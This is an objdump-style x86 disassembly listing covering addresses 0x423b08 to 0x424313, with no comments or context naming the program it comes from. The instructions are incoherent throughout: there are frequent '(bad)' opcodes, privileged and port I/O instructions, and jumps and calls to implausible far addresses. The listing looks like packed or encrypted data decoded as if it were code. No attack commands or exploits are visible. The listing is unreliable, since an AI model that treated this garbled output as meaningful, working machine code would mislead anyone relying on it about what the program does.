  423b08:	stos   DWORD PTR es:[edi],eax
  423b09:	sub    ebp,eax
  423b0b:	jb     0x423ae6
  423b0d:	data16 xlat BYTE PTR ds:[ebx]
  423b0f:	jp     0x423b67
  423b11:	lods   eax,DWORD PTR ds:[esi]
  423b12:	pop    ds
  423b13:	or     BYTE PTR [esp+edx*4+0x74891131],0x40
  423b1b:	add    BYTE PTR [esi+0x1e7739b5],al
  423b21:	mov    ebp,0x9def3401
  423b26:	add    eax,0xbf543220
  423b2b:	jge    0x423ba8
  423b2d:	icebp  
  423b2e:	push   ebx
  423b2f:	push   ds
  423b30:	arpl   cx,bx
  423b32:	add    BYTE PTR [ebp-0x5a],ch
  423b35:	aam    0x84
  423b37:	into   
  423b38:	pusha  
  423b39:	fld    DWORD PTR [eax]
  423b3b:	jb     0x423b50
  423b3d:	fld    QWORD PTR [edi+0x39104ef6]
  423b43:	sbb    eax,0xc16ec582
  423b48:	mov    dl,0xdb
  423b4a:	cmp    DWORD PTR ds:0xc96ec182,ebx
  423b50:	sbb    ch,BYTE PTR [ebp+0x24]
  423b53:	aad    0xbe
  423b55:	pop    ds
  423b56:	sti    
  423b57:	cmc    
  423b58:	push   ebp
  423b59:	lds    eax,FWORD PTR [ecx-0x1b6699d8]
  423b5f:	adc    DWORD PTR [edi+0x1d69151b],esp
  423b65:	call   0xf192f564
  423b6a:	add    BYTE PTR [esi+0x1b],0xe4
  423b6e:	out    0xeb,al
  423b70:	xchg   DWORD PTR [eax],ebp
  423b72:	test   BYTE PTR [ecx],ch
  423b74:	sti    
  423b75:	pop    ebx
  423b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b77:	jmp    0x9d7c14dd
  423b7c:	dec    ebp
  423b7d:	mov    ebp,0x9200d16e
  423b82:	fstp   TBYTE PTR [ecx]
  423b84:	mov    ebp,0xc96eb97d
  423b89:	stos   BYTE PTR es:[edi],al
  423b8a:	ins    BYTE PTR es:[edi],dx
  423b8b:	and    al,0xcd
  423b8d:	dec    esi
  423b8e:	pop    ds
  423b8f:	sti    
  423b90:	jne    0x423bf7
  423b92:	mov    ebp,0x99662881
  423b97:	in     al,0xc1
  423b99:	sbb    edx,DWORD PTR ss:0xfae7ac69
  423ba0:	cmp    DWORD PTR [ecx-0xf],esi
  423ba3:	dec    eax
  423ba4:	(bad)  
  423ba5:	stos   BYTE PTR es:[edi],al
  423ba6:	jecxz  0x423b8e
  423ba8:	jmp    0x423bc1
  423baa:	sub    BYTE PTR [eax+eax*1+0x396e97bb],al
  423bb1:	dec    edi
  423bb2:	mov    ecx,0x8a63722c
  423bb7:	(bad)  
  423bb8:	cmp    BYTE PTR [edi-0x47],cl
  423bbb:	sub    BYTE PTR [edx-0x65],dh
  423bbe:	adc    BYTE PTR [esp-0x69],dh
  423bc2:	fs ret 0x7fff
  423bc6:	mov    ecx,0xdb0a812c
  423bcb:	inc    eax
  423bcc:	in     al,0x33
  423bce:	mov    si,0xbb15
  423bd2:	out    0xfa,eax
  423bd4:	call   FWORD PTR [ebx-0x56]
  423bd7:	call   0xf753fff1
  423bdc:	jmp    0x423c17
  423bde:	gs mov ebx,0x3a967b84
  423be4:	cmp    DWORD PTR [eax],eax
  423be6:	aas    
  423be7:	(bad)  
  423be8:	xor    al,0x72
  423bea:	pop    esi
  423beb:	mov    dh,bh
  423bed:	cmp    bh,ch
  423bef:	(bad)  
  423bf0:	xor    BYTE PTR [edx+0x26],dh
  423bf3:	adc    dh,BYTE PTR [esp-0x1]
  423bf7:	pop    ebx
  423bf8:	mov    edx,0x2806cb00
  423bfd:	dec    edi
  423bff:	(bad)  
  423c00:	xor    al,0x81
  423c02:	sub    eax,0xcb00055a
  423c07:	test   al,0x4a
  423c09:	call   0x394c6d
  423c0e:	push   ecx
  423c0f:	xor    al,BYTE PTR [ebx+ebx*8+0x4481ed4f]
  423c16:	scas   eax,DWORD PTR es:[edi]
  423c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c18:	test   eax,eax
  423c1a:	das    
  423c1b:	fnstcw WORD PTR [ebx+0x8]
  423c1e:	les    ebx,FWORD PTR [edx+0x48]
  423c21:	add    al,0x84
  423c23:	dec    ebp
  423c24:	add    ebx,ebp
  423c26:	(bad)  
  423c27:	(bad)  
  423c28:	jns    0x423c6e
  423c2a:	ds loopne 0x423c5b
  423c2d:	xchg   DWORD PTR [ebp-0x7a05b1f8],ebx
  423c33:	daa    
  423c34:	jg     0x423cb2
  423c36:	inc    esi
  423c37:	mov    ah,0x4
  423c39:	je     0x423c89
  423c3b:	call   0x4feb:0x14268cfc
  423c42:	gs int3 
  423c44:	and    BYTE PTR [ebp+ebx*2-0x1b],cl
  423c48:	and    dl,BYTE PTR [edx]
  423c4a:	add    BYTE PTR [edx+0x5ec47df0],ah
  423c50:	ins    DWORD PTR es:[edi],dx
  423c51:	inc    eax
  423c52:	and    al,0x72
  423c54:	shl    BYTE PTR [eax+edx*2],0x92
  423c58:	jnp    0x423c13
  423c5a:	call   0x465646
  423c5f:	lea    ebx,[esi]
  423c61:	sub    BYTE PTR [edi-0x1f],dl
  423c64:	mov    ebx,0xf06ebe1c
  423c69:	das    
  423c6a:	xchg   DWORD PTR [esi],eax
  423c6c:	jno    0x423c46
  423c6e:	sbb    al,0x60
  423c70:	lock dec BYTE PTR [esi-0x54]
  423c74:	dec    edi
  423c75:	xor    DWORD PTR [edi-0x178682ed],eax
  423c7b:	div    DWORD PTR [esi+0x7690e8c3]
  423c81:	ret    0xd9fb
  423c84:	mov    edi,0x746df281
  423c89:	rol    BYTE PTR [eax],0x62
  423c8c:	lock or eax,0xe51944d7
  423c92:	or     bl,dh
  423c94:	cwde   
  423c95:	add    al,0x0
  423c97:	bound  esi,QWORD PTR [ebx+0x39]
  423c9a:	cld    
  423c9b:	mov    ch,0x7a
  423c9d:	mov    DWORD PTR [ebp-0xca32753],0xc8d15bd6
  423ca7:	cdq    
  423ca8:	in     eax,0x38
  423caa:	(bad)  
  423cab:	outs   dx,DWORD PTR ds:[esi]
  423cac:	cmp    esi,esi
  423cae:	inc    ebx
  423caf:	add    BYTE PTR [edx+0x5c],ah
  423cb2:	test   eax,0xe46cc57a
  423cb7:	mov    esp,DWORD PTR [edx-0x27]
  423cba:	jmp    0xe6b54ec0
  423cbf:	pop    ecx
  423cc0:	popa   
  423cc1:	jno    0x423cac
  423cc3:	add    esp,DWORD PTR [edx-0x67]
  423cc6:	ins    BYTE PTR es:[edi],dx
  423cc7:	or     BYTE PTR [edx-0x19],0x91
  423ccb:	(bad)  
  423ccc:	mov    dl,0x56
  423cce:	sbb    al,0xc8
  423cd0:	cmp    cl,BYTE PTR [edi]
  423cd2:	retf   
  423cd3:	add    al,0x62
  423cd5:	pop    ebp
  423cd6:	test   eax,0x2c56c84f
  423cdb:	rcl    BYTE PTR [edx+0x72506a5e],1
  423ce1:	push   eax
  423ce2:	mov    esp,0x6c8a92fb
  423ce7:	cmp    BYTE PTR [esi],bl
  423ce9:	repnz add dh,al
  423cec:	sbb    ebp,esp
  423cee:	fs ret 
  423cf0:	xchg   esi,eax
  423cf1:	mov    fs,WORD PTR [esi+0x48]
  423cf4:	push   cs
  423cf5:	in     eax,0xb3
  423cf7:	sbb    bh,BYTE PTR [ebp+0x66]
  423cfa:	xor    esi,eax
  423cfc:	outs   dx,DWORD PTR ds:[esi]
  423cfd:	mov    esi,0x9edf3296
  423d02:	sbb    eax,0x1d6ee933
  423d07:	(bad)  
  423d08:	ja     0x423cdb
  423d0a:	test   DWORD PTR [ebx+0x62],0x72da295e
  423d11:	push   esi
  423d12:	lods   al,BYTE PTR ds:[esi]
  423d13:	iret   
  423d14:	add    BYTE PTR [edx],dh
  423d16:	mov    DWORD PTR [ecx-0x1ad088],ebx
  423d1c:	add    ah,ch
  423d1e:	mov    dl,0x1
  423d20:	jmp    0xdb65652
  423d25:	lahf   
  423d26:	outs   dx,BYTE PTR ds:[esi]
  423d27:	cld    
  423d28:	fimul  WORD PTR [ebp+0x5e290e4c]
  423d2e:	fs dec ebp
  423d30:	int    0xa7
  423d32:	xchg   DWORD PTR [ebx-0x3a],eax
  423d35:	jne    0x423d47
  423d37:	movaps XMMWORD PTR [esi+0x5e],xmm4
  423d3b:	sar    BYTE PTR ds:0xcf397a79,0x76
  423d42:	pop    ebp
  423d43:	push   edi
  423d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d45:	lahf   
  423d46:	loopne 0x423cf6
  423d48:	call   0x823ed421
  423d4d:	xchg   esi,eax
  423d4e:	mov    bh,0x1
  423d50:	jmp    0xec296220
  423d55:	jae    0x423d70
  423d57:	pop    ebx
  423d58:	pop    ds
  423d59:	mov    edx,DWORD PTR [edx]
  423d5b:	mov    esi,0x529461d9
  423d60:	push   ss
  423d61:	stos   DWORD PTR es:[edi],eax
  423d62:	loop   0x423dc9
  423d64:	popw   ds
  423d66:	push   0xe0307214
  423d6b:	adc    al,0x61
  423d6d:	adc    BYTE PTR [eax+eax*1-0x7836b09e],ah
  423d74:	popa   
  423d75:	push   es
  423d76:	fld    DWORD PTR [eax]
  423d78:	jmp    0xc6bb57d
  423d7d:	call   0xa6ca16e3
  423d82:	icebp  
  423d83:	pop    edx
  423d84:	je     0x423d53
  423d86:	icebp  
  423d87:	push   eax
  423d88:	mov    al,0xf1
  423d8a:	pusha  
  423d8b:	fld    DWORD PTR [eax]
  423d8d:	bound  ecx,QWORD PTR [edi+0x226262c9]
  423d93:	mov    ebp,0x5ed50014
  423d98:	adc    DWORD PTR [eax],0xff00d7ca
  423d9e:	xor    al,0xf4
  423da0:	cmc    
  423da1:	adc    eax,0x3ae8eb
  423da6:	push   0x97e8151e
  423dab:	xchg   edi,eax
  423dac:	add    BYTE PTR [ebp-0x7fe96c35],al
  423db2:	pop    ds
  423db3:	mov    ecx,0x7f650018
  423db8:	add    BYTE PTR [eax-0x6a],ch
  423dbb:	fld    DWORD PTR [eax]
  423dbd:	add    BYTE PTR [eax-0x77],bl
  423dc0:	or     bh,bh
  423dc2:	xchg   esi,eax
  423dc3:	pop    edi
  423dc4:	adc    al,0x40
  423dc6:	jnp    0x423dc8
  423dc8:	(bad)  
  423dc9:	(bad)  
  423dca:	push   esi
  423dcb:	fist   DWORD PTR ds:0x56be4b40
  423dd1:	mov    edi,eax
  423dd3:	mov    cl,0xba
  423dd5:	or     al,0x3b
  423dd7:	pop    edx
  423dd8:	in     al,dx
  423dd9:	adc    BYTE PTR [eax-0x4e],bl
  423ddc:	dec    esi
  423ddd:	push   edi
  423dde:	add    al,al
  423de0:	das    
  423de1:	(bad)  
  423de2:	(bad)  
  423de3:	mov    esp,0x898b1489
  423de8:	sbb    eax,0x97198815
  423ded:	add    BYTE PTR [ebx+0x73f5e6c8],cl
  423df3:	pop    ss
  423df4:	bound  edi,QWORD PTR [eax+0xd6fa08]
  423dfa:	pcmpeqb mm7,QWORD PTR [esi]
  423dfd:	adc    BYTE PTR [ecx],al
  423dff:	or     edx,edi
  423e01:	not    DWORD PTR ds:0x3ae9eb
  423e07:	outs   dx,BYTE PTR ds:[esi]
  423e08:	mov    ds:0xb61b1024,al
  423e0d:	not    DWORD PTR ds:0x3feb9062
  423e13:	bound  edi,QWORD PTR [ebp-0x41]
  423e16:	or     ebx,esi
  423e18:	retf   
  423e19:	(bad)  
  423e1a:	jmp    DWORD PTR [edx+0x46]
  423e1d:	add    DWORD PTR [ecx+0x3c],ebx
  423e20:	daa    
  423e21:	(bad)  
  423e22:	jne    0x423dab
  423e24:	ja     0x423e66
  423e26:	adc    cl,bl
  423e28:	lods   al,BYTE PTR ds:[esi]
  423e29:	call   0x4828751
  423e2e:	add    DWORD PTR [edx-0x10],esp
  423e31:	jmp    0xff33a4bd
  423e36:	jmp    DWORD PTR [ebx-0x5c]
  423e39:	call   0xe8f6a14d
  423e3e:	adc    esp,DWORD PTR [ebx-0x5c]
  423e41:	call   0xc4a53e5d
  423e46:	call   0x8c16b766
  423e4b:	(bad)
  423e4e:	adc    DWORD PTR [ebx+0x77],edi
  423e51:	les    ebx,FWORD PTR [ecx]
  423e53:	daa    
  423e54:	and    ecx,esp
  423e56:	adc    eax,0xe3e42327
  423e5b:	jle    0x423ea7
  423e5d:	cli    
  423e5e:	xor    ch,BYTE PTR [esi]
  423e60:	stos   BYTE PTR es:[edi],al
  423e61:	in     al,0xe3
  423e63:	inc    edi
  423e64:	mov    bh,0xb8
  423e66:	stos   DWORD PTR es:[edi],eax
  423e67:	cmp    bl,bl
  423e69:	add    esp,ebx
  423e6b:	wbinvd 
  423e6d:	mov    eax,0x464e883
  423e72:	out    dx,al
  423e73:	inc    edi
  423e74:	xchg   esi,eax
  423e75:	into   
  423e76:	dec    esp
  423e77:	je     0x423eec
  423e79:	sub    BYTE PTR [eax],bh
  423e7b:	cs jmp 0xeb6621bc
  423e81:	xor    esp,ebx
  423e83:	sbb    ebx,ebx
  423e85:	sub    esp,ebx
  423e87:	pop    ss
  423e88:	stc    
  423e89:	fmul   st,st(5)
  423e8b:	mov    fs,WORD PTR [esi]
  423e8d:	mov    ebp,0xbd1e8cc5
  423e92:	cmc    
  423e93:	mov    WORD PTR [esi-0x43],ss
  423e96:	stc    
  423e97:	scas   al,BYTE PTR es:[edi]
  423e98:	jo     0x423ee8
  423e9a:	lods   eax,DWORD PTR ds:[esi]
  423e9b:	out    0x81,eax
  423e9d:	push   eax
  423e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e9f:	out    0x59,eax
  423ea1:	out    dx,al
  423ea2:	in     al,0x8c
  423ea4:	ss mov ebp,0x1e008ed1
  423eaa:	mov    ebp,0xbd268d0d
  423eaf:	cmc    
  423eb0:	nop
  423eb1:	push   ds
  423eb2:	mov    ebp,0xcb8953f9
  423eb7:	xor    DWORD PTR [ecx],ebx
  423eb9:	and    bl,cl
  423ebb:	ins    BYTE PTR es:[edi],dx
  423ebc:	ret    
  423ebd:	not    DWORD PTR [ecx-0x1dee4bb1]
  423ec3:	fld    TBYTE PTR [edi+0x56]
  423ec6:	cdq    
  423ec7:	jmp    0xea1ba138
  423ecc:	inc    ebx
  423ecd:	(bad)  
  423ece:	enter  0x60f,0xe7
  423ed2:	xchg   ebp,eax
  423ed3:	int    0x17
  423ed5:	mov    dl,0x88
  423ed7:	mov    bl,BYTE PTR [eax]
  423ed9:	inc    ch
  423edb:	sub    DWORD PTR [edx+edx*4],eax
  423ede:	jae    0x423ec9
  423ee0:	ret    0xed4f
  423ee3:	fadd   QWORD PTR [ebx+0x62]
  423ee6:	push   esp
  423ee7:	and    eax,0xadb449e8
  423eec:	out    0x71,eax
  423eee:	jno    0x423edd
  423ef0:	es (bad) 
  423ef2:	fnstcw WORD PTR [ecx+0x9b5a68e]
  423ef8:	out    dx,eax
  423ef9:	mov    eax,ds:0xf953e1b5
  423efe:	gs add eax,0x65f8e4
  423f04:	or     eax,0x96007706
  423f09:	and    bh,al
  423f0b:	mov    ah,0xfd
  423f0d:	add    BYTE PTR [ecx],ah
  423f0f:	fstp   DWORD PTR [ebx-0x41]
  423f12:	inc    edx
  423f13:	mov    BYTE PTR [edi+0x2d],bh
  423f16:	jno    0x423f37
  423f18:	add    al,0xe9
  423f1a:	cs nop
  423f1c:	push   ebp
  423f1d:	jb     0x423eac
  423f1f:	mov    ch,0x10
  423f21:	xchg   edi,eax
  423f22:	in     al,0x16
  423f24:	push   ebx
  423f25:	pusha  
  423f26:	adc    eax,0xee6210b5
  423f2b:	scas   al,BYTE PTR es:[edi]
  423f2c:	mov    eax,ds:0x74d961e9
  423f31:	sub    al,BYTE PTR [eax+eiz*8+0x57]
  423f35:	add    ah,BYTE PTR [ecx-0x5efdca9b]
  423f3b:	gs es adc al,0x1c
  423f3f:	fiadd  DWORD PTR [eax]
  423f41:	jmp    0xa869fc73
  423f46:	sub    cl,dl
  423f48:	daa    
  423f49:	test   al,0x53
  423f4b:	push   esi
  423f4c:	pushf  
  423f4d:	jmp    0xf0fe18b3
  423f52:	pop    edi
  423f53:	fld    DWORD PTR [eax]
  423f55:	fld    TBYTE PTR [esi]
  423f57:	clc    
  423f58:	push   ds
  423f59:	dec    esi
  423f5a:	pop    eax
  423f5b:	(bad)  
  423f5d:	jmp    0xeafd2570
  423f62:	pop    edi
  423f63:	fld    DWORD PTR [eax]
  423f65:	xor    al,0x23
  423f68:	test   eax,0xe7d961e9
  423f6d:	cmc    
  423f6e:	loop   0x423faa
  423f70:	add    cl,ch
  423f72:	add    BYTE PTR [ecx-0x8],ah
  423f75:	add    al,0x96
  423f77:	xchg   ecx,ebx
  423f79:	add    cl,ch
  423f7b:	mov    ds,edx
  423f7d:	sti    
  423f7e:	add    BYTE PTR [esi],bl
  423f80:	cld    
  423f81:	or     al,0x40
  423f83:	or     ecx,DWORD PTR [ebp+0x4c]
  423f86:	and    al,0xb
  423f88:	dec    ebp
  423f89:	ror    BYTE PTR [ecx+0x3912f7cf],1
  423f8f:	push   ebp
  423f90:	test   eax,0xa6cb0001
  423f95:	cmp    DWORD PTR ds:0xbb0001ad,esp
  423f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f9d:	sub    ecx,DWORD PTR ss:[ebp-0x4f]
  423fa1:	add    DWORD PTR [eax],eax
  423fa3:	retf   
  423fa4:	fsubrp st(2),st
  423fa6:	add    edi,DWORD PTR [ebx+0x3f316fdb]
  423fac:	(bad)  
  423fad:	je     0x423fbc
  423faf:	xor    DWORD PTR [ebx],esi
  423fb1:	push   ecx
  423fb2:	dec    DWORD PTR [esi+0x7b401473]
  423fb8:	jae    0x423fc2
  423fba:	je     0x423f4f
  423fbc:	in     al,0xba
  423fbe:	mov    DWORD PTR ds:0x8b0001b4,ecx
  423fc4:	push   edx
  423fc5:	jle    0x42402b
  423fc7:	jp     0x423fa4
  423fc9:	add    BYTE PTR [ecx+0x1affd],cl
  423fcf:	dec    ebx
  423fd0:	dec    esi
  423fd1:	mov    edi,0x4c4e57eb
  423fd6:	and    al,0x0
  423fd8:	dec    ebx
  423fd9:	dec    esi
  423fda:	push   esp
  423fdb:	and    al,0x53
  423fdd:	push   esp
  423fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fdf:	push   0x8900db4a
  423fe4:	lea    esi,[esi+0x543b0001]
  423fea:	xchg   BYTE PTR [edx+edi*1-0x25],ch
  423fee:	add    BYTE PTR [ebx+0x5d56794e],cl
  423ff4:	and    BYTE PTR [edx+edi*4+0x4df06204],al
  423ffb:	dec    edi
  423ffc:	scas   eax,DWORD PTR es:[edi]
  423ffd:	mov    WORD PTR es:[esi+eax*2-0xc],?
  424002:	push   edi
  424003:	xchg   eax,edi
  424005:	imul   esp,DWORD PTR [esi+0x4f1ec81],0x0
  42400c:	bound  esp,QWORD PTR [edi+ecx*1]
  42400f:	sbb    esp,0x620004ef
  424015:	inc    esp
  424016:	pop    es
  424017:	or     esp,0x620004ec
  42401d:	inc    ebp
  42401e:	pop    ecx
  42401f:	pushaw 
  424021:	aas    
  424022:	rcl    BYTE PTR ds:0x3f04f2,0xd9
  424029:	enter  0x9cfc,0x32
  42402d:	icebp  
  42402e:	(bad)  
  42402f:	call   DWORD PTR [esi]
  424031:	mov    bl,0x91
  424033:	inc    esp
  424034:	ds loopne 0x424085
  424037:	xchg   DWORD PTR [esi],esp
  424039:	int3   
  42403a:	in     al,0x65
  42403c:	add    dh,bh
  42403e:	(bad)  
  42403f:	jno    0x42400b
  424041:	ins    DWORD PTR es:[edi],dx
  424042:	pop    edi
  424043:	les    esp,FWORD PTR [esi+0x60]
  424046:	xor    DWORD PTR [ebp+0x55385910],esp
  42404c:	dec    edi
  42404d:	clc    
  42404e:	rcl    BYTE PTR [ebx-0x5],1
  424051:	ja     0x42409f
  424053:	sbb    BYTE PTR [eax+0x62],al
  424056:	jne    0x42401c
  424058:	je     0x4240ce
  42405a:	jae    0x42409c
  42405c:	and    al,0x72
  42405e:	repnz or DWORD PTR [ecx+eax*4-0x1e00010f],eax
  424066:	fnclex 
  424068:	pcmpgtd mm6,mm7
  42406b:	sbb    BYTE PTR [eax],0x63
  42406e:	lock dec BYTE PTR [eax+0x4d9d8ff]
  424075:	(bad)  
  424076:	fldcw  WORD PTR [esi+0x48]
  424079:	inc    esi
  42407a:	mov    ebp,0xce2a76e2
  42407f:	xchg   edx,eax
  424080:	(bad)  
  424081:	in     eax,0xa3
  424083:	jno    0x42409d
  424085:	mov    ds:0x52a428d9,al
  42408a:	shl    BYTE PTR [esi],cl
  42408c:	push   esp
  42408d:	xchg   ecx,eax
  42408e:	jae    0x424099
  424090:	push   edi
  424091:	fld    DWORD PTR [esi]
  424093:	(bad)  
  424094:	ret    
  424095:	and    dl,BYTE PTR [edx+0x2c]
  424098:	mov    edx,DWORD PTR es:[ebp-0x49b0e033]
  42409f:	jg     0x4240a4
  4240a1:	add    BYTE PTR [ebx+ecx*1-0x213739ef],cl
  4240a8:	stc    
  4240a9:	push   cs
  4240aa:	icebp  
  4240ab:	sbb    dl,dh
  4240ad:	aaa    
  4240ae:	jle    0x424061
  4240b0:	pop    esi
  4240b1:	xlat   BYTE PTR ds:[ebx]
  4240b2:	xor    bl,dh
  4240b4:	pop    esp
  4240b5:	call   0xabee92f7
  4240ba:	sub    eax,0x32bed1df
  4240bf:	xchg   dl,cl
  4240c1:	aad    0x8b
  4240c3:	sbb    ecx,ebp
  4240c5:	add    esp,DWORD PTR [edx-0x22]
  4240c8:	xor    al,0xe8
  4240ca:	inc    ecx
  4240cb:	push   edx
  4240cc:	call   0xe5be:0xa9df19ab
  4240d3:	jmp    0xccacfb3d
  4240d8:	push   0xffffffe5
  4240da:	(bad)  
  4240db:	fldl2t 
  4240dd:	push   cs
  4240de:	(bad)  
  4240e0:	call   0x7e9aa2e8
  4240e5:	add    DWORD PTR [ecx+0x55],ebp
  4240e8:	cmp    al,0x3
  4240ea:	(bad)  
  4240eb:	fld    DWORD PTR [eax]
  4240ed:	push   0xffffffe8
  4240ef:	fsubr  QWORD PTR [esi-0xf]
  4240f2:	loopne 0x4240d8
  4240f4:	add    al,0xdd
  4240f6:	lods   eax,DWORD PTR ds:[esi]
  4240f7:	dec    esi
  4240f8:	aas    
  4240f9:	arpl   ax,sp
  4240fb:	loope  0x4240fd
  4240fd:	ficomp WORD PTR [ebp+0x6188fa5a]
  424103:	fld    DWORD PTR [eax]
  424105:	mov    ebp,0xfa5a0a00
  42410a:	mov    esp,DWORD PTR [ecx-0x27]
  42410d:	add    BYTE PTR [ebp-0x7505a613],bh
  424113:	popa   
  424114:	fld    DWORD PTR [eax]
  424116:	popf   
  424117:	lds    ebx,FWORD PTR [ecx-0x6]
  42411a:	dec    ecx
  42411b:	popa   
  42411c:	fld    DWORD PTR [eax]
  42411e:	popf   
  42411f:	mov    ebp,0x6144fa59
  424124:	fld    DWORD PTR [eax]
  424126:	jl     0x4241a5
  424128:	bnd jae 0x424113
  42412b:	popa   
  42412c:	fldenv [esi-0x18]
  42412f:	jnp    0x42410a
  424131:	push   ebx
  424132:	and    DWORD PTR [ecx-0x78],0xfffffffb
  424136:	cld    
  424137:	push   ecx
  424138:	mov    BYTE PTR [eax-0x17],0xda
  42413c:	or     DWORD PTR [edi-0x352495c],eax
  424142:	into   
  424143:	mov    edi,0x720d73e0
  424148:	mov    edx,DWORD PTR [edx-0x2e]
  42414b:	imul   ebx,DWORD PTR [ecx-0x6],0xd95e88
  424152:	xor    al,0x69
  424154:	jae    0x424156
  424156:	adc    edx,DWORD PTR [edi]
  424158:	loopne 0x4241ce
  42415a:	icebp  
  42415b:	cli    
  42415c:	mov    al,0x81
  42415e:	xchg   edi,eax
  42415f:	mov    esi,0x74e900d9
  424164:	mov    eax,0xb24b0066
  424169:	imul   bl
  42416b:	add    dh,bl
  42416d:	push   edi
  42416e:	mul    BYTE PTR [ebx+0x7500d83b]
  424174:	sub    ah,BYTE PTR [eax+0x60]
  424177:	lock or ebx,eax
  42417a:	div    DWORD PTR [edi+eiz*2-0x17]
  42417e:	add    eax,0x68853bb7
  424183:	adc    cl,BYTE PTR [edx]
  424185:	fadd   DWORD PTR [eax]
  424187:	push   edi
  424188:	pushf  
  424189:	les    ecx,FWORD PTR [eax+0x57d7bb14]
  42418f:	pop    esi
  424190:	into   
  424191:	sbb    BYTE PTR [ecx-0x3e],0xb3
  424195:	xlat   BYTE PTR ds:[ebx]
  424196:	cmp    esi,0xd526
  42419c:	mov    esp,0xbb010153
  4241a1:	xlat   BYTE PTR ds:[ebx]
  4241a2:	cmp    esi,0xd52a
  4241a8:	push   edx
  4241a9:	mov    ds:0x56acfff7,al
  4241ae:	mul    BYTE PTR [ebx+0x7400d7bb]
  4241b4:	cmp    bl,BYTE PTR [eax-0xa]
  4241b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241b8:	mov    edx,edi
  4241ba:	add    BYTE PTR [edi],cl
  4241bc:	pop    es
  4241bd:	cmp    al,BYTE PTR [eax]
  4241bf:	add    BYTE PTR [ebx+0x56],bh
  4241c2:	mul    BYTE PTR [ecx+0x7500d78b]
  4241c8:	(bad)  
  4241c9:	mov    cl,0x1
  4241cb:	push   DWORD PTR [edi]
  4241cd:	icebp  
  4241ce:	sbb    dl,BYTE PTR [edi+0x0]
  4241d1:	and    ebp,edx
  4241d3:	dec    edi
  4241d4:	push   DWORD PTR [esi]
  4241d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241d7:	adc    eax,0xd0524b40
  4241dc:	mov    edi,esi
  4241de:	cs nop
  4241e0:	sti    
  4241e1:	bound  eax,QWORD PTR [ebx-0x44]
  4241e4:	out    0x8,eax
  4241e6:	jb     0x4241a5
  4241e8:	sahf   
  4241e9:	(bad)  
  4241ea:	lock dec BYTE PTR [edx]
  4241ed:	out    0x1e,eax
  4241ef:	mov    esp,0x437825fb
  4241f4:	and    al,0x7a
  4241f6:	arpl   WORD PTR [edi],di
  4241f8:	and    al,0x62
  4241fa:	lock add BYTE PTR [eax],al
  4241fd:	xchg   esi,eax
  4241fe:	popa   
  4241ff:	ja     0x424221
  424201:	adc    dh,cl
  424203:	(bad)  
  424204:	call   0xfbfecd7a
  424209:	loope  0x4241a2
  42420b:	push   es
  42420c:	je     0x4241b0
  42420e:	jmp    0x42419c
  424210:	xor    al,0xe5
  424212:	mov    ds:0x1d97fbc,eax
  424217:	cmp    eax,0x13b7e1a6
  42421c:	je     0x42428b
  42421e:	outs   dx,DWORD PTR ds:[esi]
  42421f:	mov    eax,0xde6d5515
  424224:	cli    
  424225:	mov    ebp,0xfa7ecb
  42422a:	icebp  
  42422b:	(bad)  
  42422c:	call   FWORD PTR [ebp+0x75]
  42422f:	scas   al,BYTE PTR es:[edi]
  424230:	cli    
  424231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424232:	jecxz  0x4242a9
  424234:	add    BYTE PTR [eax],0x93
  424237:	lock (bad) 
  424239:	call   0xfbf93593
  42423e:	jecxz  0x42423a
  424240:	popa   
  424241:	add    BYTE PTR [edx-0x10],ah
  424244:	add    eax,0xb70a9985
  424249:	sti    
  42424a:	mov    ecx,ecx
  42424c:	mov    bh,0xfb
  42424e:	ins    DWORD PTR es:[edi],dx
  42424f:	pop    ecx
  424250:	mov    bh,0xfb
  424252:	(bad)  
  424253:	lock cmp edx,0x0
  424257:	lock (bad) 
  424259:	dec    edi
  42425b:	fxch   st(7)
  42425d:	mov    fs,WORD PTR [esi-0x5d70fe4b]
  424263:	mov    ch,0x40
  424265:	add    al,0x62
  424267:	fsubr  st,st(1)
  424269:	or     bl,dh
  42426b:	mov    ch,0x82
  42426d:	mov    ebx,0x3e9b429
  424272:	(bad)  
  424273:	fdivr  DWORD PTR [edx-0x24]
  424276:	jne    0x424291
  424278:	les    esi,FWORD PTR [ebx+0xe9d962]
  42427e:	push   edx
  42427f:	jmp    0x229b466c
  424284:	sub    DWORD PTR [edi+0x614b5868],ebp
  42428a:	(bad)  
  42428b:	fldl2t 
  42428d:	or     ah,bh
  42428f:	fnstcw WORD PTR [edx]
  424291:	mov    ebx,0x22284de9
  424296:	out    0x18,eax
  424298:	fidivr DWORD PTR [edi+0x0]
  42429b:	into   
  42429c:	fisub  DWORD PTR [ecx]
  42429e:	mov    ebx,0xb289e40
  4242a3:	fild   WORD PTR [ecx]
  4242a5:	adc    edi,DWORD PTR [ebx-0x206b2647]
  4242ab:	mov    DWORD PTR [edx+0xbb3e8f],eax
  4242b1:	sti    
  4242b2:	mov    edx,0x540555a9
  4242b7:	sub    eax,0xdd529384
  4242bc:	fist   WORD PTR ds:0xf991e5cd
  4242c2:	mov    gs,WORD PTR [ebp+ecx*2+0x513b21c0]
  4242c9:	stc    
  4242ca:	add    al,0x62
  4242cc:	fnstcw WORD PTR ds:0x564e4f2
  4242d2:	sub    al,0x70
  4242d4:	adc    eax,0xea8de800
  4242d9:	test   DWORD PTR ds:0x72533d42,edx
  4242df:	sbb    dl,al
  4242e1:	pop    es
  4242e2:	mov    ds:0x8a7ed508,al
  4242e7:	sti    
  4242e8:	or     al,cl
  4242ea:	xchg   edi,eax
  4242eb:	sbb    al,0xde
  4242ed:	je     0x4242e3
  4242ef:	jg     0x4242cb
  4242f1:	dec    edi
  4242f2:	sbb    BYTE PTR ds:0xc9a686a7,ch
  4242f8:	push   ebp
  4242f9:	imul   DWORD PTR [esi-0x28]
  4242fc:	pusha  
  4242fd:	dec    ebp
  4242fe:	or     eax,0x4d623e00
  424303:	add    eax,0x6224c072
  424308:	mov    ecx,esp
  42430a:	(bad)  
  42430b:	call   0xbd2ea171
  424310:	arpl   WORD PTR [edx+0x4d],sp
  424313:	add    eax,0x9810c052
